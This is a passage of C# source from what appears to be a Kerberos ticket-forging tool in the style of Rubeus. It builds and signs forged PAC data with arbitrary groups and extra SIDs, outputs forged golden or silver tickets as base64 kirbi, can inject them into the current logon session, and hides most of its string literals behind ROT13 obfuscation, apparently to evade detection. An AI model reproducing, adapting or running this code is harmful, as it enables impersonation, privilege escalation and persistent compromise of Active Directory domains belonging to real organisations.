                    if (userObject.ContainsKey(new string("cjqynfgfrg".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())) && (DateTime)userObject[new string("cjqynfgfrg".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())] != DateTime.MinValue)
                    {
                        kvi.PasswordLastSet = new Ndr._FILETIME((DateTime)userObject[new string("cjqynfgfrg".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())]);
                    }
                    kvi.PrimaryGroupId = Int32.Parse((string)userObject[new string("cevzneltebhcvq".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())]);
                    kvi.UserId = Int32.Parse(objectSid.Substring(objectSid.LastIndexOf('-') + 1));
                    if (userObject.ContainsKey(new string("ubzrqverpgbel".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())))
                    {
                        kvi.HomeDirectory = new Ndr._RPC_UNICODE_STRING((string)userObject[new string("ubzrqverpgbel".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())]);
                    }
                    if (userObject.ContainsKey(new string("ubzrqevir".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())))
                    {
                        kvi.HomeDirectoryDrive = new Ndr._RPC_UNICODE_STRING((string)userObject[new string("ubzrqevir".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())]);
                    }
                    if (userObject.ContainsKey(new string("cebsvyrcngu".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())))
                    {
                        kvi.ProfilePath = new Ndr._RPC_UNICODE_STRING((string)userObject[new string("cebsvyrcngu".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())]);
                    }
                    if (userObject.ContainsKey(new string("fpevcgcngu".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())))
                    {
                        kvi.LogonScript = new Ndr._RPC_UNICODE_STRING((string)userObject[new string("fpevcgcngu".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())]);
                    }

                }

            }
            else if (String.IsNullOrEmpty(sid))
            {
                Console.WriteLine(new string("[K] Gb sbetr gvpxrgf jvgubhg fcrpvslvat '/yqnc', '/fvq' vf erdhverq.".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                return;
            }

            KRB_CRED cred = new KRB_CRED();
            KrbCredInfo info = new KrbCredInfo();

            Console.WriteLine(new string("[*] Ohvyqvat CNP".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));

            if (!String.IsNullOrEmpty(netbiosName))
            {
                kvi.LogonDomainName = new Ndr._RPC_UNICODE_STRING(netbiosName);
            }
            if (!String.IsNullOrEmpty(sid))
            {
                kvi.LogonDomainId = new Ndr._RPC_SID(new SecurityIdentifier(sid));
            }
            if (!String.IsNullOrEmpty(groups))
            {
                List<int> allGroups = new List<int>();
                foreach (string gid in groups.Split(','))
                {
                    try
                    {
                        allGroups.Add(Int32.Parse(gid));
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine("[X] Error unable to parse group id {0}: {1}", gid, e.Message);
                    }
                }
                if ((pGid != null) && !allGroups.Contains((int)pGid))
                    allGroups.Add((int)pGid);
                int numOfGroups = allGroups.Count;
                kvi.GroupCount = numOfGroups;
                kvi.GroupIds = new Ndr._GROUP_MEMBERSHIP[numOfGroups];
                c = 0;
                foreach (int gid in allGroups)
                {
                    Array.Copy(new Ndr._GROUP_MEMBERSHIP[] { new Ndr._GROUP_MEMBERSHIP(gid, Interop.GROUP_ATTRIBUTES_DEFAULT) }, 0, kvi.GroupIds, c, 1);
                    c += 1;
                }
            }
            if (!String.IsNullOrEmpty(sids))
            {
                int numOfSids = sids.Split(',').Length;
                kvi.SidCount = numOfSids;
                kvi.ExtraSids = new Ndr._KERB_SID_AND_ATTRIBUTES[numOfSids];
                c = 0;
                foreach (string s in sids.Split(','))
                {
                    Array.Copy(new Ndr._KERB_SID_AND_ATTRIBUTES[] { new Ndr._KERB_SID_AND_ATTRIBUTES(new Ndr._RPC_SID(new SecurityIdentifier(s)), Interop.GROUP_ATTRIBUTES_DEFAULT) }, 0, kvi.ExtraSids, c, 1);
                    c += 1;
                }
            }
            if (!String.IsNullOrEmpty(resourceGroupSid) && (resourceGroups != null))
            {
                try
                {
                    kvi.ResourceGroupDomainSid = new Ndr._RPC_SID(new SecurityIdentifier(resourceGroupSid));
                    kvi.ResourceGroupCount = resourceGroups.Count;
                    kvi.ResourceGroupIds = new Ndr._GROUP_MEMBERSHIP[resourceGroups.Count];
                    c = 0;

                    foreach (int rgroup in resourceGroups)
                    {
                        Array.Copy(new Ndr._GROUP_MEMBERSHIP[] { new Ndr._GROUP_MEMBERSHIP(rgroup, Interop.R_GROUP_ATTRIBUTES_DEFAULT) }, 0, kvi.ResourceGroupIds, c, 1);
                        c += 1;
                    }
                }
                catch
                {

                }
            }
            if (kvi.SidCount > 0)
            {
                kvi.UserFlags = kvi.UserFlags | (int)Interop.PacUserFlags.EXTRA_SIDS;
            }
            if (kvi.ResourceGroupCount > 0)
            {
                kvi.UserFlags = kvi.UserFlags | (int)Interop.PacUserFlags.RESOURCE_GROUPS;
            }
            if (!String.IsNullOrEmpty(domainController))
            {
                string dcName = Networking.GetDCNameFromIP(domainController);
                if (dcName != null)
                {
                    kvi.LogonServer = new Ndr._RPC_UNICODE_STRING(domainController.Substring(0, domainController.IndexOf('.')).ToUpper());
                }
            }
            if (!String.IsNullOrEmpty(displayName))
            {
                kvi.FullName = new Ndr._RPC_UNICODE_STRING(displayName);
            }
            if (logonCount != null)
            {
                kvi.LogonCount = (short)logonCount;
            }
            if (badPwdCount != null)
            {
                kvi.BadPasswordCount = (short)badPwdCount;
            }
            if (lastLogon != null)
            {
                kvi.LogonTime = new Ndr._FILETIME((DateTime)lastLogon);
            }
            if (logoffTime != null)
            {
                kvi.LogoffTime = new Ndr._FILETIME((DateTime)logoffTime);
            }
            if (pwdLastSet != null)
            {
                kvi.PasswordLastSet = new Ndr._FILETIME((DateTime)pwdLastSet);
            }
            if (origMinPassAge != null)
            {
                try
                {
                    DateTime passLastSet = DateTime.FromFileTimeUtc((long)kvi.PasswordLastSet.LowDateTime | ((long)kvi.PasswordLastSet.HighDateTime << 32));
                    if (minPassAge > 0)
                    {
                        kvi.PasswordCanChange = new Ndr._FILETIME(passLastSet.AddDays((double)minPassAge));
                    }
                }
                catch
                {
                    Console.WriteLine(new string("[!] Fbzrguvat jrag jebat frggvat gur CnffjbeqPnaPunatr svryq, creuncf CnffjbeqYnfgFrg vf abg pbasvtherq cebcreyl".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                }
            }
            if (origMaxPassAge != null && (((Interop.PacUserAccountControl)kvi.UserAccountControl & Interop.PacUserAccountControl.DONT_EXPIRE_PASSWORD) == 0))
            {
                try
                {
                    DateTime passLastSet = DateTime.FromFileTimeUtc((long)kvi.PasswordLastSet.LowDateTime | ((long)kvi.PasswordLastSet.HighDateTime << 32));
                    if (maxPassAge > 0)
                    {
                        kvi.PasswordMustChange = new Ndr._FILETIME(passLastSet.AddDays((double)maxPassAge));
                    }
                }
                catch
                {
                    Console.WriteLine(new string("[!] Fbzrguvat jrag jebat frggvat gur CnffjbeqZhfgPunatr svryq, creuncf CnffjbeqYnfgFrg vf abg pbasvtherq cebcreyl".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                }
            }
            if (id != null)
            {
                kvi.UserId = (int)id;
            }
            if (pGid != null)
            {
                kvi.PrimaryGroupId = (int)pGid;
            }
            if (!String.IsNullOrEmpty(homeDir))
            {
                kvi.HomeDirectory = new Ndr._RPC_UNICODE_STRING(homeDir);
            }
            if (!String.IsNullOrEmpty(homeDrive))
            {
                kvi.HomeDirectoryDrive = new Ndr._RPC_UNICODE_STRING(homeDrive);
            }
            if (!String.IsNullOrEmpty(profilePath))
            {
                kvi.ProfilePath = new Ndr._RPC_UNICODE_STRING(profilePath);
            }
            if (!String.IsNullOrEmpty(scriptPath))
            {
                kvi.LogonScript = new Ndr._RPC_UNICODE_STRING(scriptPath);
            }


            Random random = new Random();
            byte[] randKeyBytes;
            SignatureData svrSigData = new SignatureData(PacInfoBufferType.ServerChecksum);
            SignatureData kdcSigData = new SignatureData(PacInfoBufferType.KDCChecksum);
            SignatureData fullPacSigData = new SignatureData(PacInfoBufferType.FullPacChecksum);
            int svrSigLength = 12, kdcSigLength = 12, fullPacSigLength = 12;
            if (etype == Interop.KERB_ETYPE.rc4_hmac)
            {
                randKeyBytes = new byte[16];
                random.NextBytes(randKeyBytes);
                svrSigData.SignatureType = Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_MD5;
                kdcSigData.SignatureType = Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_MD5;
                fullPacSigData.SignatureType = Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_MD5;
                svrSigLength = 16;
                kdcSigLength = 16;
                fullPacSigLength = 16;
            }
            else if (etype == Interop.KERB_ETYPE.aes256_cts_hmac_sha1)
            {
                randKeyBytes = new byte[32];
                random.NextBytes(randKeyBytes);
                svrSigData.SignatureType = Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_SHA1_96_AES256;
                kdcSigData.SignatureType = Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_SHA1_96_AES256;
                fullPacSigData.SignatureType = Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_SHA1_96_AES256;
            }
            else
            {
                Console.WriteLine(new string("[K] Bayl ep4_uznp naq nrf256_pgf_uznp_fun1 xrl unfurf fhccbegrq ng guvf gvzr!".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                return;
            }

            if (krbKey != null)
            {
                kdcSigData.SignatureType = krbeType;
                fullPacSigData.SignatureType = krbeType;
                if ((krbeType == Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_SHA1_96_AES256) || (krbeType == Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_SHA1_96_AES128))
                {
                    kdcSigLength = 12;
                    fullPacSigLength = 12;
                }
                else
                {
                    kdcSigLength = 16;
                    fullPacSigLength = 16;
                }
            }

            if (krbKey == null)
            {
                krbKey = serviceKey;
            }

            Console.WriteLine("");
            Console.WriteLine("[*] Domain         : {0} ({1})", domain.ToUpper(), kvi.LogonDomainName);
            Console.WriteLine("[*] SID            : {0}", kvi.LogonDomainId?.GetValue());
            Console.WriteLine("[*] UserId         : {0}", kvi.UserId);
            if (kvi.GroupCount > 0)
            {
                Console.WriteLine("[*] Groups         : {0}", kvi.GroupIds?.GetValue().Select(g => g.RelativeId.ToString()).Aggregate((cur, next) => cur + "," + next));
            }
            if (kvi.SidCount > 0)
            {
                Console.WriteLine("[*] ExtraSIDs      : {0}", kvi.ExtraSids.GetValue().Select(s => s.Sid.ToString()).Aggregate((cur, next) => cur + "," + next));
            }
            Console.WriteLine("[*] ServiceKey     : {0}", Helpers.ByteArrayToString(serviceKey));
            Console.WriteLine("[*] ServiceKeyType : {0}", svrSigData.SignatureType);
            Console.WriteLine("[*] KDCKey         : {0}", Helpers.ByteArrayToString(krbKey));
            Console.WriteLine("[*] KDCKeyType     : {0}", kdcSigData.SignatureType);
            Console.WriteLine("[*] Service        : {0}", parts[0]);
            Console.WriteLine("[*] Target         : {0}", parts[1]);
            Console.WriteLine("");

            do
            {
                kvi.LogonTime = new Ndr._FILETIME((DateTime)startTime);
                LogonInfo li = new LogonInfo(kvi);

                if (String.IsNullOrEmpty(cName))
                    cName = user;
                if (String.IsNullOrEmpty(cRealm))
                    cRealm = domain;

                ClientName cn = null;
                if (parts[0].Equals(new string("xeogtg".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())) && !cRealm.Equals(domain))
                    cn = new ClientName((DateTime)startTime, String.Format("{0}@{1}@{1}", user, domain.ToUpper()));
                else
                    cn = new ClientName((DateTime)startTime, user);

                UpnDns upnDns = new UpnDns(upnFlags, domain.ToUpper(), String.Format("{0}@{1}", user, domain.ToLower()));
                if (extendedUpnDns)
                {
                    upnDns = new UpnDns(upnFlags + 2, domain.ToUpper(), String.Format("{0}@{1}", user, domain.ToLower()), user, new SecurityIdentifier(String.Format("{0}-{1}", li.KerbValidationInfo.LogonDomainId?.GetValue(), li.KerbValidationInfo.UserId)));
                }

                S4UDelegationInfo s4u = null;
                if (!String.IsNullOrEmpty(s4uProxyTarget) && !String.IsNullOrEmpty(s4uTransitedServices))
                {
                    s4u = new S4UDelegationInfo(s4uProxyTarget, s4uTransitedServices.Split(','));
                }

                Console.WriteLine(new string("[*] Trarengvat RapGvpxrgCneg".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));

                EncTicketPart decTicketPart = new EncTicketPart(randKeyBytes, etype, cRealm.ToUpper(), cName, flags, cn.ClientId);

                DateTime? check = null;
                decTicketPart.authtime = (DateTime)authTime;
                if (!String.IsNullOrEmpty(endTime))
                {
                    check = Helpers.FutureDate((DateTime)startTime, endTime);
                    if (check != null)
                    {
                        decTicketPart.endtime = (DateTime)check;
                    }
                }
                if (!String.IsNullOrEmpty(renewTill))
                {
                    check = Helpers.FutureDate((DateTime)startTime, renewTill);
                    if (check != null)
                    {
                        decTicketPart.renew_till = (DateTime)check;
                    }
                }

                if (decTicketPart.authorization_data == null)
                {
                    decTicketPart.authorization_data = new List<AuthorizationData>();
                }

                SignatureData ticketSigData = null;
                if (!(parts[0].Equals(new string("xeogtg".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())) && parts[1].Equals(domain)))
                {
                    ticketSigData = new SignatureData(PacInfoBufferType.TicketChecksum);
                    ticketSigData.SignatureType = kdcSigData.SignatureType;
                    ADIfRelevant ifrelevant = new ADIfRelevant();
                    ADWin2KPac win2KPac = new ADWin2KPac();
                    win2KPac.Pac = null;
                    win2KPac.ad_data = new byte[] { 0x00 };
                    decTicketPart.authorization_data.Add(new ADIfRelevant(win2KPac));
                }

                if (includeAuthData)
                {
                    ADIfRelevant ifrelevant = new ADIfRelevant();
                    ADRestrictionEntry restrictions = new ADRestrictionEntry();
                    ADKerbLocal kerbLocal = new ADKerbLocal();
                    ifrelevant.ADData.Add(restrictions);
                    ifrelevant.ADData.Add(kerbLocal);
                    decTicketPart.authorization_data.Add(ifrelevant);
                }

                if (!(parts[0].Equals(new string("xeogtg".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())) && parts[1].Equals(domain)))
                {
                    ticketSigData.Signature = decTicketPart.CalculateTicketChecksum(krbKey, kdcSigData.SignatureType);
                }

                Attributes attrib = null;
                Requestor requestor = null;
                if (newPac)
                {
                    attrib = new Attributes();
                    requestor = new Requestor(String.Format("{0}-{1}", li.KerbValidationInfo.LogonDomainId?.GetValue(), li.KerbValidationInfo.UserId));
                }

                Console.WriteLine(new string("[*] Fvtavat CNP".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                svrSigData.Signature = new byte[svrSigLength];
                kdcSigData.Signature = new byte[kdcSigLength];
                Array.Clear(svrSigData.Signature, 0, svrSigLength);
                Array.Clear(kdcSigData.Signature, 0, kdcSigLength);
                if (!noFullPacSig && !(parts[0].Equals(new string("xeogtg".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())) && parts[1].Equals(domain)))
                {
                    fullPacSigData.Signature = new byte[fullPacSigLength];
                    Array.Clear(fullPacSigData.Signature, 0, fullPacSigLength);
                }

                List<PacInfoBuffer> PacInfoBuffers = new List<PacInfoBuffer>();
                if (s4u != null)
                {
                    PacInfoBuffers.Add(s4u);
                }
                PacInfoBuffers.Add(li);
                PacInfoBuffers.Add(cn);
                PacInfoBuffers.Add(upnDns);
                if (newPac)
                {
                    PacInfoBuffers.Add(attrib);
                    PacInfoBuffers.Add(requestor);
                }
                PacInfoBuffers.Add(svrSigData);
                PacInfoBuffers.Add(kdcSigData);
                if (ticketSigData != null)
                {
                    PacInfoBuffers.Add(ticketSigData);
                }

                if (!noFullPacSig && !(parts[0].Equals(new string("xeogtg".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())) && parts[1].Equals(domain)))
                {
                    var newPacInfoBuffers = new List<PacInfoBuffer>(PacInfoBuffers);
                    newPacInfoBuffers.Add(fullPacSigData);
                    PACTYPE tmpPt = new PACTYPE(0, newPacInfoBuffers);
                    byte[] tmpPtBytes = tmpPt.Encode();
                    byte[] fullPacSig = Crypto.KerberosChecksum(krbKey, tmpPtBytes, fullPacSigData.SignatureType);
                    fullPacSigData.Signature = fullPacSig;
                    PacInfoBuffers.Add(fullPacSigData);
                }
                PACTYPE pt = new PACTYPE(0, PacInfoBuffers);
                byte[] ptBytes = pt.Encode();

                byte[] svrSig = Crypto.KerberosChecksum(serviceKey, ptBytes, svrSigData.SignatureType);
                byte[] kdcSig = Crypto.KerberosChecksum(krbKey, svrSig, kdcSigData.SignatureType);

                svrSigData.Signature = svrSig;
                kdcSigData.Signature = kdcSig;
                PacInfoBuffers = new List<PacInfoBuffer>();
                if (s4u != null)
                {
                    PacInfoBuffers.Add(s4u);
                }
                PacInfoBuffers.Add(li);
                PacInfoBuffers.Add(cn);
                PacInfoBuffers.Add(upnDns);
                if (newPac)
                {
                    PacInfoBuffers.Add(attrib);
                    PacInfoBuffers.Add(requestor);
                }
                PacInfoBuffers.Add(svrSigData);
                PacInfoBuffers.Add(kdcSigData);
                if (ticketSigData != null)
                {
                    PacInfoBuffers.Add(ticketSigData);
                }
                if (!noFullPacSig && !(parts[0].Equals(new string("xeogtg".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())) && parts[1].Equals(domain)))
                {
                    PacInfoBuffers.Add(fullPacSigData);
                }
                pt = new PACTYPE(0, PacInfoBuffers);

                decTicketPart.SetPac(pt);


                Console.WriteLine(new string("[*] Rapelcgvat RapGvpxrgCneg".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                byte[] encTicketData = decTicketPart.Encode().Encode();
                byte[] encTicketPart = Crypto.KerberosEncrypt(etype, Interop.KRB_KEY_USAGE_AS_REP_TGS_REP, serviceKey, encTicketData);

                Console.WriteLine(new string("[*] Trarengvat Gvpxrg".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                Ticket ticket = new Ticket(domain.ToUpper(), sname);
                if (rodcNumber == 0)
                {
                    ticket.enc_part = new EncryptedData((Int32)etype, encTicketPart, 3);
                }
                else
                {
                    ticket.enc_part = new EncryptedData((Int32)etype, encTicketPart, (uint)rodcNumber << 16);
                }
                cred.tickets.Add(ticket);

                info.key.keytype = (int)etype;
                info.key.keyvalue = randKeyBytes;

                info.prealm = ticket.realm;

                info.pname.name_type = decTicketPart.cname.name_type;
                info.pname.name_string = decTicketPart.cname.name_string;

                info.flags = flags;

                info.authtime = decTicketPart.authtime;

                info.starttime = decTicketPart.starttime;

                info.endtime = decTicketPart.endtime;

                info.renew_till = decTicketPart.renew_till;

                info.srealm = ticket.realm;

                info.sname.name_type = ticket.sname.name_type;
                info.sname.name_string = ticket.sname.name_string;

                cred.enc_part.ticket_info.Add(info);

                Console.WriteLine(new string("[*] Trarengrq XREO-PERQ".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));



                byte[] kirbiBytes = cred.Encode().Encode();

                string kirbiString = Convert.ToBase64String(kirbiBytes);

                if (parts[0] == new string("xeogtg".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()))
                {
                    Console.WriteLine("[*] Forged a TGT for '{0}@{1}'", info.pname.name_string[0], domain);
                }
                else
                {
                    Console.WriteLine("[*] Forged a TGS for '{0}' to '{1}'", info.pname.name_string[0], sname);
                }
                Console.WriteLine("");

                Console.WriteLine("[*] AuthTime       : {0}", decTicketPart.authtime.ToLocalTime().ToString(CultureInfo.CurrentCulture));
                Console.WriteLine("[*] StartTime      : {0}", decTicketPart.starttime.ToLocalTime().ToString(CultureInfo.CurrentCulture));
                Console.WriteLine("[*] EndTime        : {0}", decTicketPart.endtime.ToLocalTime().ToString(CultureInfo.CurrentCulture));
                Console.WriteLine("[*] RenewTill      : {0}", decTicketPart.renew_till.ToLocalTime().ToString(CultureInfo.CurrentCulture));

                Console.WriteLine("");

                Console.WriteLine(new string("[*] onfr64(gvpxrg.xveov):\\e\a".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));

                if (Program.wrapTickets)
                {
                    foreach (string line in Helpers.Split(kirbiString, 80))
                    {
                        Console.WriteLine("      {0}", line);
                    }
                }
                else
                {
                    Console.WriteLine("      {0}", kirbiString);
                }

                Console.WriteLine("");

                if (!String.IsNullOrEmpty(outfile))
                {
                    DateTime fileTime = (DateTime)startTime;
                    string filename = $"{Helpers.GetBaseFromFilename(outfile)}_{fileTime.ToString("yyyy_MM_dd_HH_mm_ss")}_{info.pname.name_string[0]}_to_{info.sname.name_string[0]}@{info.srealm}{Helpers.GetExtensionFromFilename(outfile)}";
                    filename = Helpers.MakeValidFileName(filename);
                    if (Helpers.WriteBytesToFile(filename, kirbiBytes))
                    {
                        Console.WriteLine("\r\n[*] Ticket written to {0}\r\n", filename);
                    }
                }

                Console.WriteLine("");

                if (ptt)
                {
                    LSA.ImportTicket(kirbiBytes, new LUID());
                }

                startTime = Helpers.FutureDate((DateTime)startTime, rangeInterval);
                if (startTime == null)
                {
                    Console.WriteLine("[!] Invalid /rangeinterval passed, skipping multiple ticket generation: {0}", rangeInterval);
                    startTime = rangeEnd;
                }
                authTime = startTime;

            } while (startTime < rangeEnd);

            if (printcmd)
            {
                string cmdOut = String.Format("{0}", System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName);

                if (parts[0].Equals(new string("xeogtg".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())) && parts[1].Equals(domain))
                {
                    cmdOut = String.Format("{0} golden", cmdOut, Helpers.ByteArrayToString(serviceKey));
                }
                else
                {
                    string krbEncType = "";
                    if (kdcSigData.SignatureType.Equals(Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_MD5))
                    {
                        krbEncType = new string("ep4".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray());
                    }
                    else if (kdcSigData.SignatureType.Equals(Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_SHA1_96_AES128))
                    {
                        krbEncType = new string("nrf128".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray());
                    }
                    else if (kdcSigData.SignatureType.Equals(Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_SHA1_96_AES256))
                    {
                        krbEncType = new string("nrf256".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray());
                    }
                    cmdOut = String.Format("{0} silver /service:{1} /krbkey:{2} /kebenctype:{3}", cmdOut, sname, Helpers.ByteArrayToString(krbKey), krbEncType);
                }

                string svrEncType = "";
                if (svrSigData.SignatureType.Equals(Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_MD5))
                {
                    svrEncType = new string("ep4".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray());
                }
                else if (svrSigData.SignatureType.Equals(Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_SHA1_96_AES128))
                {
